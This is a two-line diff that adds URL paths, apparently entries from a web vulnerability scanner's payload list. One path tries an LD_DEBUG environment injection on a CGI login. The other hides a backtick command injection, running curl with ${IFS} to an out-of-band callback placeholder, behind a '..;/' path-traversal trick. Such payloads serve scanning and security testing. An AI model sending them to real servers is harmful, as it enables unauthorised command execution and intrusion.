@@ -1,0 +1,2 @@
+/cgi-bin/login?LD_DEBUG=files
+/misc/`curl${IFS}{{interactsh-url}}`/..;/index.html
